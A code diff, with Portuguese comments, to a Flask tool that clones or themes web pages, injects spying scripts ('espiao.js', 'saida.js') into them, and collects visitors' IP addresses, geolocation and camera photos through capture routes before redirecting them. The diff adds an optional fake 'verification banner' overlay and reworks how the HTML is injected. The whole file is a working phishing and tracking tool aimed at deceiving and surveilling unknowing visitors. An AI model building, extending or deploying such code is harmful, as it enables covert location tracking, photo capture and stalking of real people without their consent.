@@ -48,6 +48,7 @@ def mostrar_menu():
     
     ativar_loc = input(" Ativar localização? (s/n): ").lower() == 's'
     ativar_foto = input(" Ativar foto? (s/n): ").lower() == 's'
+    ativar_banner = input(" Ativar banner de verificação? (s/n): ").lower() == 's'   # <-- NOVA OPÇÃO
     
     url_custom = ""
     if opcao == "5":
@@ -62,7 +63,7 @@ def mostrar_menu():
                 res = requests.get(url_custom, verify=False, timeout=10)
                 with open(os.path.join(caminho_novo, "index.html"), "w", encoding="utf-8") as f:
                     f.write(res.text)
-                return nome_pasta, input(" URL de redirecionamento: "), url_custom, ativar_loc, ativar_foto
+                return nome_pasta, input(" URL de redirecionamento: "), url_custom, ativar_loc, ativar_foto, ativar_banner
             except: print("Erro ao salvar.")
 
     link_destino = input(" Digite a URL para redirecionar: ")
@@ -70,9 +71,10 @@ def mostrar_menu():
     tema_escolhido = temas_disponiveis.get(opcao, "google")
     if opcao == "5": tema_escolhido = "custom"
 
-    return tema_escolhido, link_destino, url_custom, ativar_loc, ativar_foto
+    return tema_escolhido, link_destino, url_custom, ativar_loc, ativar_foto, ativar_banner
 
-pasta_tema, url_redirecionamento, url_alvo_custom, usar_loc, usar_foto = mostrar_menu()
+# Desempacotando com a nova variável
+pasta_tema, url_redirecionamento, url_alvo_custom, usar_loc, usar_foto, ativar_banner = mostrar_menu()
 
 # --- PERSONALIZAÇÃO DE PREVIEW ---
 print("\n" + "="*40)
@@ -113,7 +115,7 @@ def index():
     except Exception as e:
         return f"Erro: {e}", 500
 
-    # --- LIMPEZA DE METADADOS ANTIGOS (Para funcionar no clone) ---
+    # --- LIMPEZA DE METADADOS ANTIGOS ---
     if personalizar == 's':
         html_original = re.sub(r'<title>.*?</title>', '', html_original, flags=re.IGNORECASE)
         html_original = re.sub(r'<meta property="og:.*?>', '', html_original, flags=re.IGNORECASE)
@@ -131,6 +133,7 @@ def index():
             f'<meta name="description" content="{meta_desc}">\n'
         )
 
+    # ==================== BANNER (agora opcional) ====================
     css_banner = '''
     <style>
         #bloqueio-spy { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #ffffff; 
@@ -164,26 +167,36 @@ def index():
     
     scripts_captura = '\n<script src="/static/js/espiao.js"></script>\n<script src="/static/js/saida.js"></script>\n'
 
-    head_content = meta_tags + css_banner + script_config + scripts_captura
-    
+    head_content = meta_tags + script_config + scripts_captura
+
+    # Só adiciona o banner se estiver ativado
+    if ativar_banner:
+        head_content = css_banner + head_content
+        banner_html = html_banner
+    else:
+        banner_html = ""
+
+    # Injeta no <head>
     if re.search(r'<head', html_original, re.IGNORECASE):
         html_final = re.sub(r'(<head[^>]*>)', r'\1' + head_content, html_original, flags=re.IGNORECASE, count=1)
     else:
         html_final = head_content + html_original
 
-    if re.search(r'<body', html_final, re.IGNORECASE):
-        html_final = re.sub(r'(<body[^>]*>)', r'\1' + html_banner, html_final, flags=re.IGNORECASE, count=1)
-    else:
-        html_final = html_banner + html_final
+    # Injeta o banner no <body> (se ativado)
+    if ativar_banner:
+        if re.search(r'<body', html_final, re.IGNORECASE):
+            html_final = re.sub(r'(<body[^>]*>)', r'\1' + banner_html, html_final, flags=re.IGNORECASE, count=1)
+        else:
+            html_final = banner_html + html_final
     
     return render_template_string(html_final)
 
+# ==================== ROTAS DE CAPTURA (mantidas iguais) ====================
 @app.route('/capturar', methods=['POST'])
 def capturar():
     dados = request.json
     ip_list = request.headers.getlist("X-Forwarded-For")
     
-    # Extrai apenas o IP puro da lista se ela existir
     if ip_list:
         ip_publico = ip_list[0]
     else:
@@ -220,3 +233,4 @@ def receber_foto():
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8080)
+    
